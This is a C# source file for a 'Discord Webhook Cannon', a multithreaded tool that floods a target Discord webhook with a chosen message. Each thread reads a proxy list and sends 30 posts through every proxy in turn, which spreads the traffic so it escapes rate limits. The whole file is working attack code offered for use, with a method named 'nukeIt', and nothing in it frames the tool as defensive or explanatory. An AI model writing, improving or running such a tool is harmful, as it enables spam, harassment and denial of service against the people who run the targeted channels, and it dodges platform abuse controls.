using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.Threading;
using System.IO;
using System.Net;
using System.Collections.Specialized;
using System.Net.NetworkInformation;
using System.Diagnostics;
using System.Net.Sockets;

namespace Discord_Webhook_Cannon
{
    class Cannon
    {
        private WebClient dWebClient;
        private static NameValueCollection discord = new NameValueCollection();

        public void StartThreads(string webhook, string proxyList, string threads, string message)
        {
            for(int i = 1; i <= Int32.Parse(threads); i++)
            {
                Thread thread = new Thread(() => { nukeIt(webhook, proxyList, message); });
                thread.Start();
                Console.WriteLine("Started thread nr: " + i);
            }
        }

        public void nukeIt(string webhook, string proxylist, string message)
        {
            dWebClient = new WebClient();
            discord.Add("content", message);
            int i = 0;

            string proxyUsername = "";
            string proxyPassword = "";

            foreach (string line in File.ReadAllLines(proxylist))
            {
                i++;
                Console.WriteLine("Req nr: " + i + " " + line);
                WebProxy proxy1 = new WebProxy("http://" + line);

                try
                {
                    for (int j = 1; j <= 30; j++)
                    {
                        proxy1.Credentials = new NetworkCredential(proxyUsername, proxyPassword);
                        dWebClient.Proxy = proxy1;
                        dWebClient.UploadValues(webhook, discord);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                    continue;
                }
            }
        }
    }
}
